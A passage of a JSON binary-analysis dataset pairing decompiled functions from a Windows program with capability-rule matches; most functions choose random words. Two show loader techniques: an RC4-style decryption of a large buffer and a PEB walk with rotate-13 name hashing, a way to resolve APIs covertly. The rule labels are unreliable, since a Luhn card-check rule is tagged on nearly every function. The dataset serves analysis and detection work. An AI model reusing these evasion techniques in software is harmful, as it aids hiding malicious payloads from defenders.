        "decompiled_code": "\nint32_t * fcn.00401b50(int32_t *param_1, int32_t *param_2, char *param_3)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t **ppiVar7;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    piVar1 = param_2;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x434ca8;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    piVar3 = (**(**(*param_2 + -0x10) + 0x10))();\n    iVar4 = (**(*piVar3 + 0xc))();\n    param_2 = iVar4 + 0x10;\n    uStack4 = 0;\n    if (param_3 == NULL) {\n        iVar4 = 0;\n    }\n    else {\n        pcVar5 = param_3;\n        do {\n            cVar2 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar2 != '\\0');\n        iVar4 = pcVar5 - (param_3 + 1);\n    }\n    fcn.00401860(&param_2, *piVar1, *(*piVar1 + -0xc), param_3, iVar4);\n    iVar4 = param_2;\n    ppiVar7 = param_2 + -0x10;\n    iVar6 = fcn.004013a0(ppiVar7);\n    *param_1 = iVar6 + 0x10;\n    uStack4 = 0xffffffff;\n    piVar1 = iVar4 + -4;\n    LOCK();\n    iVar4 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar4 == 1 || iVar4 + -1 < 0) {\n        (**(**ppiVar7 + 4))(ppiVar7);\n    }\n    *in_FS_OFFSET = uStack12;\n    return param_1;\n}\n",
        "token_count": 494
    },
    "00401cd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00401cd0(int32_t *param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x434cc8;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    piVar2 = fcn.00428235();\n    iVar3 = (**(*piVar2 + 0xc))();\n    *param_1 = iVar3 + 0x10;\n    uStack4 = 0;\n    if (param_2 == NULL) {\n        iVar3 = 0;\n    }\n    else {\n        if ((param_2 & 0xffff0000) == 0) {\n            iVar3 = fcn.0042822a(param_2 & 0xffff);\n            if (iVar3 != 0) {\n                fcn.00401490(iVar3, param_2 & 0xffff);\n                *in_FS_OFFSET = unaff_EDI;\n                return param_1;\n            }\n            goto code_r0x00401d62;\n        }\n        pcVar4 = param_2;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        iVar3 = pcVar4 - (param_2 + 1);\n    }\n    fcn.00401560(param_2, iVar3);\ncode_r0x00401d62:\n    *in_FS_OFFSET = unaff_ESI;\n    return param_1;\n}\n",
        "token_count": 414
    },
    "00402060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00402060(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char **in_FS_OFFSET;\n    char *apcStack52 [4];\n    uint uStack36;\n    uint32_t uStack24;\n    uchar uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x434e3c;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    apcStack52[3] = \"cute\";\n    uStack36 = 0;\n    apcStack52[2] = 0x40208e;\n    fcn.00401cd0();\n    apcStack52[2] = \"charming\";\n    uStack8 = 1;\n    apcStack52[1] = 0x4020a4;\n    fcn.00401cd0();\n    apcStack52[1] = \"frightening\";\n    uStack12 = CONCAT31(uStack12._1_3_, 2);\n    apcStack52[0] = 0x4020b7;\n    fcn.00401cd0();\n    apcStack52[0] = \"scary\";\n    uStack16 = CONCAT31(uStack16._1_3_, 3);\n    fcn.00401cd0();\n    uStack20 = 4;\n    fcn.00401cd0(\"spooky\");\n    uStack24 = 5;\n    do {\n        iVar2 = fcn.0041aefd();\n        iVar2 = iVar2 % 5;\n    } while (iVar2 == *0x4430a8);\n    *0x4430a8 = iVar2;\n    iVar2 = fcn.004013a0(*(&stack0xffffffcc + iVar2 * 4) + -0x10);\n    piVar1 = uStack16;\n    *uStack16 = iVar2 + 0x10;\n    uStack24 = uStack24 & 0xffffff00;\n    fcn.0041b954(&stack0xffffffcc, 4, 5, fcn.00401420);\n    *in_FS_OFFSET = apcStack52[1];\n    return piVar1;\n}\n",
        "token_count": 532
    },
    "00403190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00403190(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char **in_FS_OFFSET;\n    int32_t iStack68;\n    char *pcStack64;\n    char *pcStack60;\n    char *pcStack56;\n    char *pcStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar uStack36;\n    int32_t *piStack28;\n    uchar uStack24;\n    uchar uStack20;\n    char cStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x435554;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    uStack44 = 0x437ba8;\n    uStack40 = 0;\n    uStack48 = 0x4031be;\n    fcn.00401cd0();\n    uStack48 = 0x437ba4;\n    uStack8 = 1;\n    pcStack52 = 0x4031d4;\n    fcn.00401cd0();\n    pcStack52 = \"someone\";\n    uStack12 = CONCAT31(uStack12._1_3_, 2);\n    pcStack56 = 0x4031e7;\n    fcn.00401cd0();\n    pcStack56 = \"anyone\";\n    cStack16 = '\\x03';\n    pcStack60 = 0x4031fa;\n    fcn.00401cd0();\n    pcStack60 = \"no one\";\n    uStack20 = 4;\n    pcStack64 = 0x40320d;\n    fcn.00401cd0();\n    pcStack64 = \"everyone\";\n    uStack24 = 5;\n    iStack68 = 0x403220;\n    fcn.00401cd0();\n    piStack28 = 0x6;\n    if (cStack16 != '\\0') {\n        iStack68 = 2;\n        fcn.00401560(0x437b7c);\n    }\n    do {\n        iVar2 = fcn.0041aefd();\n        iVar2 = iVar2 % 6;\n    } while (iVar2 == *0x4430b4);\n    *0x4430b4 = iVar2;\n    iVar2 = fcn.004013a0(*(&stack0xffffffbc + iVar2 * 4) + -0x10);\n    piVar1 = piStack28;\n    *piStack28 = iVar2 + 0x10;\n    uStack36 = 0;\n    fcn.0041b954(&stack0xffffffbc, 4, 6, fcn.00401420);\n    *in_FS_OFFSET = pcStack60;\n    return piVar1;\n}\n",
        "token_count": 643
    },
    "004032b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "PEB access"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.004032b0(void)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    char **in_FS_OFFSET;\n    char *apcStack44 [6];\n    uint32_t uStack20;\n    uchar uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x4356c4;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    apcStack44[2] = \"like\";\n    apcStack44[3] = NULL;\n    apcStack44[1] = 0x4032de;\n    fcn.00401cd0();\n    apcStack44[1] = \"hate\";\n    uStack8 = 1;\n    apcStack44[0] = 0x4032f4;\n    fcn.00401cd0();\n    apcStack44[0] = \"dislike\";\n    uStack12 = CONCAT31(uStack12._1_3_, 2);\n    fcn.00401cd0();\n    uStack16 = 3;\n    fcn.00401cd0(\"love\");\n    uStack20 = 4;\n    do {\n        uVar2 = fcn.0041aefd();\n        uVar2 = uVar2 & 0x80000003;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xfffffffc) + 1;\n        }\n    } while (uVar2 == *0x4430b8);\n    *0x4430b8 = uVar2;\n    iVar3 = fcn.004013a0(*(&stack0xffffffd4 + uVar2 * 4) + -0x10);\n    piVar1 = uStack12;\n    *uStack12 = iVar3 + 0x10;\n    uStack20 = uStack20 & 0xffffff00;\n    fcn.0041b954(&stack0xffffffd4, 4, 4, fcn.00401420);\n    *in_FS_OFFSET = apcStack44[0];\n    return piVar1;\n}\n",
        "token_count": 519
    },
    "00403390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00403390(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t **ppiVar4;\n    char **in_FS_OFFSET;\n    int32_t iVar5;\n    char *pcStack76;\n    uint uStack72;\n    char *apcStack68 [4];\n    char *pcStack52;\n    uint uStack44;\n    uchar uStack40;\n    uint uStack32;\n    uchar uStack28;\n    uchar uStack24;\n    char cStack20;\n    uchar uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x4355c4;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    pcStack52 = \"donout\";\n    uStack44 = 0;\n    apcStack68[3] = 0x4033be;\n    fcn.00401cd0();\n    apcStack68[3] = \"muffin\";\n    uStack8 = 1;\n    apcStack68[2] = 0x4033d4;\n    fcn.00401cd0();\n    apcStack68[2] = \"chicken\";\n    uStack12 = CONCAT31(uStack12._1_3_, 2);\n    apcStack68[1] = 0x4033e7;\n    fcn.00401cd0();\n    apcStack68[1] = \"ice cream\";\n    uStack16 = 3;\n    apcStack68[0] = 0x4033fa;\n    fcn.00401cd0();\n    apcStack68[0] = \"cake\";\n    cStack20 = '\\x04';\n    uStack72 = 0x40340d;\n    fcn.00401cd0();\n    uStack72 = 0x437bd4;\n    uStack24 = 5;\n    pcStack76 = 0x403420;\n    fcn.00401cd0();\n    pcStack76 = \"pretzel\";\n    uStack28 = 6;\n    fcn.00401cd0();\n    uStack32 = 0x7;\n    do {\n        iVar3 = fcn.0041aefd();\n        iVar3 = iVar3 % 7;\n    } while (iVar3 == *0x4430bc);\n    iVar5 = 0x403468;\n    *0x4430bc = iVar3;\n    iVar3 = fcn.004013a0(*(&stack0xffffffbc + iVar3 * 4) + -0x10);\n    pcStack76 = iVar3 + 0x10;\n    uStack32 = CONCAT31(uStack32._1_3_, 8);\n    if (cStack20 != '\\0') {\n        iVar5 = 0x437540;\n        fcn.004018f0(0x437540, 1);\n    }\n    ppiVar4 = iVar5 + -0x10;\n    iVar3 = fcn.004013a0(ppiVar4);\n    piVar2 = uStack32;\n    *uStack32 = iVar3 + 0x10;\n    uStack40 = 7;\n    piVar1 = iVar5 + -4;\n    LOCK();\n    iVar3 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar3 == 1 || iVar3 + -1 < 0) {\n        (**(**ppiVar4 + 4))(ppiVar4);\n    }\n    uStack40 = 0;\n    fcn.0041b954(&stack0xffffffb4, 4, 7, fcn.00401420);\n    *in_FS_OFFSET = apcStack68[1];\n    return piVar2;\n}\n",
        "token_count": 868
    },
    "00403500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00403500(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    char *apcStack68 [4];\n    char *pcStack52;\n    uint uStack48;\n    uint uStack44;\n    uint32_t uStack32;\n    uchar uStack28;\n    uint uStack24;\n    uchar uStack20;\n    uchar uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43562c;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    uStack48 = 0x437c40;\n    uStack44 = 0;\n    pcStack52 = 0x40352e;\n    fcn.00401cd0();\n    pcStack52 = \"good\";\n    uStack8 = 1;\n    apcStack68[3] = 0x403544;\n    fcn.00401cd0();\n    apcStack68[3] = 0x437c34;\n    uStack12 = CONCAT31(uStack12._1_3_, 2);\n    apcStack68[2] = 0x403557;\n    fcn.00401cd0();\n    apcStack68[2] = \"excellent\";\n    uStack16 = 3;\n    apcStack68[1] = 0x40356a;\n    fcn.00401cd0();\n    apcStack68[1] = \"terrible\";\n    uStack20 = 4;\n    apcStack68[0] = 0x40357d;\n    fcn.00401cd0();\n    apcStack68[0] = \"very good\";\n    uStack24 = CONCAT31(uStack24._1_3_, 5);\n    fcn.00401cd0();\n    uStack28 = 6;\n    fcn.00401cd0(\"very bad\");\n    uStack32 = 7;\n    do {\n        iVar2 = fcn.0041aefd();\n        iVar2 = iVar2 % 7;\n    } while (iVar2 == *0x4430c0);\n    *0x4430c0 = iVar2;\n    iVar2 = fcn.004013a0(*(&stack0xffffffbc + iVar2 * 4) + -0x10);\n    piVar1 = uStack24;\n    *uStack24 = iVar2 + 0x10;\n    uStack32 = uStack32 & 0xffffff00;\n    fcn.0041b954(&stack0xffffffbc, 4, 7, fcn.00401420);\n    *in_FS_OFFSET = apcStack68[3];\n    return piVar1;\n}\n",
        "token_count": 636
    },
    "00403620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.00403620(void)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t unaff_ESI;\n    uint32_t *in_FS_OFFSET;\n    int32_t aiStack28 [4];\n    uint32_t uStack12;\n    uint uStack8;\n    int32_t *piStack4;\n    \n    piStack4 = 0xffffffff;\n    uStack8 = 0x435674;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    aiStack28[0] = 0x437c4c;\n    aiStack28[1] = 0;\n    fcn.00401cd0();\n    uStack8 = 1;\n    fcn.00401cd0(\"don\\'t\");\n    uStack12 = 2;\n    do {\n        uVar2 = fcn.0041aefd();\n        uVar2 = uVar2 & 0x80000001;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xfffffffe) + 1;\n        }\n    } while (uVar2 == *0x4430c4);\n    *0x4430c4 = uVar2;\n    iVar3 = fcn.004013a0(aiStack28[uVar2] + -0x10);\n    piVar1 = piStack4;\n    *piStack4 = iVar3 + 0x10;\n    uStack12 = uStack12 & 0xffffff00;\n    fcn.0041b954(aiStack28, 4, 2, fcn.00401420);\n    *in_FS_OFFSET = unaff_ESI;\n    return piVar1;\n}\n",
        "token_count": 396
    },
    "004036e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "PEB access"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.004036e0(void)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    char **in_FS_OFFSET;\n    char *apcStack44 [6];\n    uint32_t uStack20;\n    uchar uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x4356c4;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    apcStack44[2] = \"happy\";\n    apcStack44[3] = NULL;\n    apcStack44[1] = 0x40370e;\n    fcn.00401cd0();\n    apcStack44[1] = \"unhappy\";\n    uStack8 = 1;\n    apcStack44[0] = 0x403724;\n    fcn.00401cd0();\n    apcStack44[0] = \"glad\";\n    uStack12 = CONCAT31(uStack12._1_3_, 2);\n    fcn.00401cd0();\n    uStack16 = 3;\n    fcn.00401cd0(0x437c50);\n    uStack20 = 4;\n    do {\n        uVar2 = fcn.0041aefd();\n        uVar2 = uVar2 & 0x80000003;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xfffffffc) + 1;\n        }\n    } while (uVar2 == *0x4430c8);\n    *0x4430c8 = uVar2;\n    iVar3 = fcn.004013a0(*(&stack0xffffffd4 + uVar2 * 4) + -0x10);\n    piVar1 = uStack12;\n    *uStack12 = iVar3 + 0x10;\n    uStack20 = uStack20 & 0xffffff00;\n    fcn.0041b954(&stack0xffffffd4, 4, 4, fcn.00401420);\n    *in_FS_OFFSET = apcStack44[0];\n    return piVar1;\n}\n",
        "token_count": 521
    },
    "004037c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004037c0(void)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t unaff_ESI;\n    uint32_t *in_FS_OFFSET;\n    char *apcStack28 [4];\n    uint32_t uStack12;\n    uint uStack8;\n    int32_t *piStack4;\n    \n    piStack4 = 0xffffffff;\n    uStack8 = 0x435674;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    apcStack28[0] = \"common\";\n    apcStack28[1] = NULL;\n    fcn.00401cd0();\n    uStack8 = 1;\n    fcn.00401cd0(\"rare\");\n    uStack12 = 2;\n    do {\n        uVar2 = fcn.0041aefd();\n        uVar2 = uVar2 & 0x80000001;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xfffffffe) + 1;\n        }\n    } while (uVar2 == *0x4430cc);\n    *0x4430cc = uVar2;\n    iVar3 = fcn.004013a0(apcStack28[uVar2] + -0x10);\n    piVar1 = piStack4;\n    *piStack4 = iVar3 + 0x10;\n    uStack12 = uStack12 & 0xffffff00;\n    fcn.0041b954(apcStack28, 4, 2, fcn.00401420);\n    *in_FS_OFFSET = unaff_ESI;\n    return piVar1;\n}\n",
        "token_count": 392
    },
    "004038b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004038b0(uint param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x4356e8;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    iStack16 = 0;\n    uVar3 = fcn.00402780(&iStack16);\n    uStack4 = 0;\n    uVar4 = fcn.00402150(&iStack20);\n    uStack4._0_1_ = 1;\n    uVar4 = fcn.00401b50(&iStack24, uVar4, 0x437c7c);\n    uStack4._0_1_ = 2;\n    fcn.00401aa0(param_1, uVar4, uVar3);\n    uStack4._0_1_ = 1;\n    piVar1 = iStack24 + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(iStack24 + -0x10) + 4))(iStack24 + -0x10);\n    }\n    uStack4 = uStack4._1_3_ << 8;\n    piVar1 = iStack20 + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(iStack20 + -0x10) + 4))(iStack20 + -0x10);\n    }\n    uStack4 = 0xffffffff;\n    piVar1 = iStack16 + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**(iStack16 + -0x10) + 4))(iStack16 + -0x10);\n    }\n    *in_FS_OFFSET = uStack12;\n    return param_1;\n}\n",
        "token_count": 568
    },
    "00431016": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00431016(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CWinApp.0;\n    piVar1 = extraout_ECX[0x15];\n    *(unaff_EBP + -4) = 0;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))(1);\n    }\n    if (extraout_ECX[0x21] != NULL) {\n        (**(*extraout_ECX[0x21] + 0x18))(1);\n    }\n    iVar3 = fcn.00431a51();\n    if (*(iVar3 + 0x14) == '\\0') {\n        if (*0x44785c != NULL) {\n            (**(**0x44785c + 4))(1);\n            *0x44785c = NULL;\n        }\n        if (*0x447858 != NULL) {\n            (**(**0x447858 + 4))(1);\n            *0x447858 = NULL;\n        }\n    }\n    if (extraout_ECX[0x1b] != NULL) {\n        fcn.0042fc69(extraout_ECX[0x1b]);\n    }\n    if (extraout_ECX[0x1c] != NULL) {\n        fcn.0042fc69(extraout_ECX[0x1c]);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalDeleteAtom;\n    if (*(extraout_ECX + 0x23) != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)(*(extraout_ECX + 0x23));\n    }\n    if (*(extraout_ECX + 0x8e) != 0) {\n        (*pcVar2)(*(extraout_ECX + 0x8e));\n    }\n    if (extraout_ECX[0x22] != NULL) {\n        (**(*extraout_ECX[0x22] + 4))(1);\n    }\n    iVar3 = fcn.00431a51();\n    if (*(iVar3 + 0x10) == extraout_ECX[0x13]) {\n        *(iVar3 + 0x10) = 0;\n    }\n    if (*(iVar3 + 4) == extraout_ECX) {\n        *(iVar3 + 4) = 0;\n    }\n    fcn.0041ba6d(extraout_ECX[0x13]);\n    fcn.0041ba6d(extraout_ECX[0x14]);\n    fcn.0041ba6d(extraout_ECX[0x17]);\n    fcn.0041ba6d(extraout_ECX[0x18]);\n    fcn.0041ba6d(extraout_ECX[0x19]);\n    *(unaff_EBP + -4) = 0xffffffff;\n    extraout_ECX[10] = NULL;\n    fcn.00434b21();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 794
    },
    "00404620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404620(int32_t param_1, int32_t param_2)\n\n{\n    if (param_1 != param_2) {\n        do {\n            fcn.00404600();\n            param_1 = param_1 + 0x10;\n        } while (param_1 != param_2);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "00404650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404650(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(param_1 + 4);\n    if (iVar2 != 0) {\n        iVar1 = *(param_1 + 8);\n        for (; iVar2 != iVar1; iVar2 = iVar2 + 0x10) {\n            fcn.00404600();\n        }\n        fcn.00428fdc(*(param_1 + 4));\n    }\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0xc) = 0;\n    return;\n}\n",
        "token_count": 159
    },
    "004046b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004046b0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x4358bd;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    uStack4 = 4;\n    fcn.0042766f();\n    uStack4._0_1_ = 3;\n    fcn.004308ad();\n    uStack4._0_1_ = 2;\n    fcn.00427899();\n    uStack4 = CONCAT31(uStack4._1_3_, 1);\n    fcn.00427899();\n    fcn.00404650();\n    uStack4 = 0xffffffff;\n    fcn.00429026();\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 205
    },
    "004047d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint32_t fcn.004047d0(void)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t in_stack_000d95e0;\n    uint32_t in_stack_000d95e4;\n    uint32_t in_stack_000d95e8;\n    int32_t in_stack_000d95ec;\n    \n    fcn.0041bcd0();\n    uVar2 = 0;\n    if (in_stack_000d95ec != 0) {\n        do {\n            (&stack0x00000000)[uVar2] = uVar2;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < 0xd95dc);\n        uVar4 = 0;\n        uVar2 = 0;\n        do {\n            uVar1 = (&stack0x00000000)[uVar2];\n            uVar4 = (uVar1 + *(in_stack_000d95e0 + (uVar2 % in_stack_000d95e4) * 2) + uVar4) % 0xd95dc;\n            uVar3 = uVar2 + 1;\n            (&stack0x00000000)[uVar2] = (&stack0x00000000)[uVar4];\n            (&stack0x00000000)[uVar4] = uVar1;\n            uVar2 = uVar3;\n        } while (uVar3 < 0xd95dc);\n        uVar3 = 0;\n        uVar4 = 0;\n        do {\n            uVar4 = (uVar4 + 1) % 0xd95dc;\n            in_stack_000d95ec = in_stack_000d95ec + -1;\n            uVar1 = (&stack0x00000000)[uVar4];\n            uVar3 = (uVar1 + uVar3) % 0xd95dc;\n            (&stack0x00000000)[uVar4] = (&stack0x00000000)[uVar3];\n            (&stack0x00000000)[uVar3] = uVar1;\n            *(in_stack_000d95e8 + in_stack_000d95ec) =\n                 (~(&stack0x00000000)[((&stack0x00000000)[uVar4] + uVar1) % 0xd95dc] |\n                 ~*(in_stack_000d95e8 + in_stack_000d95ec)) &\n                 ((&stack0x00000000)[((&stack0x00000000)[uVar4] + uVar1) % 0xd95dc] |\n                 *(in_stack_000d95e8 + in_stack_000d95ec));\n            uVar2 = in_stack_000d95e8;\n        } while (in_stack_000d95ec != 0);\n    }\n    return uVar2;\n}\n",
        "token_count": 651
    },
    "004048d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004048d0(void)\n\n{\n    uint *puVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    int32_t in_FS_OFFSET;\n    \n    puVar4 = *(*(*(in_FS_OFFSET + *0x4430d8) + *0x4430dc) + *0x4430e0);\n    do {\n        uVar6 = 0;\n        iVar3 = *0x4430ec;\n        puVar5 = *(puVar4 + *0x4430e4);\n        do {\n            uVar2 = *puVar5;\n            if ('`' < uVar2) {\n                uVar2 = uVar2 - 0x20;\n            }\n            uVar6 = (uVar6 >> 0xd | uVar6 << 0x13) + uVar2;\n            iVar3 = iVar3 + -1;\n            puVar5 = puVar5 + 1;\n        } while (iVar3 != 0);\n        puVar1 = puVar4 + 4;\n        puVar4 = *puVar4;\n    } while (uVar6 != *0x4430e8);\n    return *puVar1;\n}\n",
        "token_count": 289
    },
    "00404b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
